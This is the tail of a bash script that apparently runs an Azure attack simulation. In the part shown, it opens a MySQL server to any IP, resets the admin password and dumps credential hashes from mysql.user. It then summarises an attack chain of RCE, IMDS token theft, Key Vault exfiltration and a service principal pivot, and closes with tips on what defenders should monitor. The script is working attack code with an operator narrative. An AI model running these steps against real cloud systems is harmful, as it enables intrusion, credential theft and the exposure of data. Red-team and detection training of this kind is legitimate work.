ok "Admin password reset completed"
printf "  • New password: %s%s%s\n" "$MAGENTA" "$NEW_DB_PASSWORD" "$RESET"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We have successfully:\n"
printf "  • Added a permissive firewall rule allowing any IP to connect\n"
printf "  • Reset the administrator password to a value we control\n\n"
printf "The database is now fully accessible from the internet.\n"
printf "Next step: Connect directly and exfiltrate sensitive data.\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. MySQL data exfiltration
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. MySQL data exfiltration  ===" "${RESET}"

step "Leaking MySQL credentials from mysql.user"

MYSQL_PWD=$NEW_DB_PASSWORD mysql -h "$MYSQL_FQDN" -u "$MYSQL_ADMIN" -D mysql -e "SELECT User, Host, plugin, authentication_string FROM user;"

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Exploited RCE vulnerability on VMa web application\n"
printf "  2. Harvested Azure tokens from Instance Metadata Service (IMDS)\n"
printf "  3. Enumerated RBAC permissions for stolen Managed Identity\n"
printf "  4. Accessed Azure Key Vault and exfiltrated Service Principal credentials\n"
printf "  5. Pivoted to Service Principal with MySQL server permissions\n"
printf "  6. Exposed MySQL server (firewall + password reset)\n"
printf "  7. Connected to database and exfiltrated sensitive data\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full compromise of Azure MySQL Flexible Server\n"
printf "  • Credential theft from Azure Key Vault\n"
printf "  • Lateral movement via Service Principal pivot\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Unusual IMDS access patterns from VMs\n"
printf "  • Key Vault secret access from unexpected identities\n"
printf "  • Azure Resource Manager control plane changes (firewall, password reset)\n"
printf "  • Database connections from unusual source IPs\n"